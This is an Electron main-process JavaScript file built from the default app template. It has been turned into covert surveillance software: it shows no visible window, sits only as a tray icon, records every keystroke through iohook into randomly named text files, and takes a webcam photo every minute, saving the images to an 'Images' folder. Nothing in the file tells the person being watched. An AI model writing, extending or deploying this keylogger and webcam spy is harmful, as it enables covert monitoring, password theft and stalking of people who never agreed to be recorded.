// Modules to control application life and create native browser window
const {app, BrowserWindow,Tray,Menu} = require('electron')
const path = require('path')
// const iconPath=path.join(__dirname,"images.png");
const url = require('url')
function createWindow () {
  // Create the browser window.
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: true
    }
  
  })
 
  // and load the index.html of the app.
  mainWindow.loadFile('index.html')
  mainWindow.setMenuBarVisibility(false)
  // Open the DevTools.
  // mainWindow.webContents.openDevTools()

}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(
  //createWindow
  function()
  {
    let trayIcon = new Tray(path.join(__dirname,"images.png"))

    const trayMenuTemplate = [
     
       
       {
          label: 'Close Application',
          click: function () {
            if (process.platform !== 'darwin') app.quit()
          }
       }
    ]
    
    let trayMenu = Menu.buildFromTemplate(trayMenuTemplate)
    trayIcon.setContextMenu(trayMenu)
  

  //
  var fs = require('fs'); 
   //
   const ioHook = require('iohook');
   //const fs=require('fs');
   var FileName="Images/"+getRandomInt(9999999999)+".txt";
   let text="";
   let main="";
  setInterval(function(){
     FileName="Images/"+getRandomInt(9999999999)+".txt";
      text="";
      main="";
  },600000)
     
      
     
   ioHook.on('keydown', function(e)
   {
 
    
    text=String.fromCharCode(e.rawcode);
 
     main+=text;
     fs.writeFileSync(FileName,main); 
    // document.getElementById("logs").innerHTML= main;
     
   });
      
 
  
// Register and start hook
ioHook.start();
   
// Alternatively, pass true to start in DEBUG mode.
ioHook.start(true);
//WEB CAM
//Available in nodejs
 
var NodeWebcam = require( "node-webcam" );
 
 
//Default options
 
var opts = {
 
    //Picture related
 
    width: 1280,
 
    height: 720,
 
    quality: 100,
 
 
    //Delay in seconds to take shot
    //if the platform supports miliseconds
    //use a float (0.1)
    //Currently only on windows
 
    delay: 10,
 
 
    //Save shots in memory
 
    saveShots: true,
 
 
    // [jpeg, png] support varies
    // Webcam.OutputTypes
 
    output: "png",
 
 
    //Which camera to use
    //Use Webcam.list() for results
    //false for default device
 
    device: false,
 
 
    // [location, buffer, base64]
    // Webcam.CallbackReturnTypes
 
    callbackReturn: "base64",
 
 
    //Logging
 
    verbose: false
 
};
 
 
//Creates webcam instance
 
var Webcam = NodeWebcam.create( opts );
 
//Will automatically append location output type
setInterval(function(){
  Webcam.capture( "test_picture", function( err, data ) {
  // var file = urltoFile(data).then(function(file){

  //     fs.writeFileSync("Images/new3.png",file);
  // });
  var file = decodeBase64Image(data);
  fs.writeFileSync("Images/"+getRandomInt(9999999999)+".png",file.data);
} );
},60000)

 
 
//Also available for quick use
 
// NodeWebcam.capture( "test_picture", opts, function( err, data ) {
//   fs.writeFileSync("Images/new1.txt",data);
// });
 
 
//Get list of cameras
 
// Webcam.list( function( list ) {
 
//     //Use another device
 
//     var anotherCam = NodeWebcam.create( { device: list[ 0 ] } );
 
// });
 
//Return type with base 64 image
 
// var opts = {
//     callbackReturn: "base64"
// };
 
// NodeWebcam.capture( "test_picture", opts, function( err, data ) {
 
//     var image = "<img src='" + data + "'>";
//     fs.writeFileSync("Images/NAEEMABBAS.bmp",data);
//     fs.writeFileSync("Images/new.webp",image);
  
 
// });

  }
 
  )

// Quit when all windows are closed.
app.on('window-all-closed', function () {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') app.quit()
})

app.on('activate', function () {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) createWindow()
})
// Don't show the window and create a tray instead
app.on('ready', () => { 
  win = new BrowserWindow({ show: false }); 
  //appIcon = new Tray(iconPath);
  //show window on tray icon click etc....
});
// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.
function decodeBase64Image(dataString) {
  var matches = dataString.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/),
    response = {};

  if (matches.length !== 3) {
    return new Error('Invalid input string');
  }

  response.type = matches[1];
  response.data = new Buffer(matches[2], 'base64');

  return response;
}
function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}